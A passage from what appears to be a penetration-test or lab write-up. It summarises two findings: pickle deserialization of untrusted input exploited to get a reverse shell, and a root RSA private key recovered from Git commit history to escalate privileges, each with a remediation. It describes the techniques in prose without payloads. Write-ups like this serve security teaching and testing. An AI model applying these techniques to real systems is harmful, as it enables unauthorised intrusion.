2. Lack of input validation that allowed us to run arbitrary commands on the system. The application was taking in untrusted user input and unpacking it using the pickle python deserialization library. Since the input was not properly validated, we generated a string of malicious input that sent a reverse shell back to our attack machine. Remediations for this vulnerability include input validation and using secure libraries that have built in input validation checks.

To escalate privileges we exploited one vulnerability.

1. Sensitive information disclosure. The developer had previously committed the root RSA private key in a Github repository. Although the key was replaced with the correct one, we were still able to access the original key in the commit history. Remediation for this vulnerability would be to remove the file from the repository’s history. For more information on how to do that, refer to [this link](https://help.github.com/en/github/authenticating-to-github/removing-sensitive-data-from-a-repository).

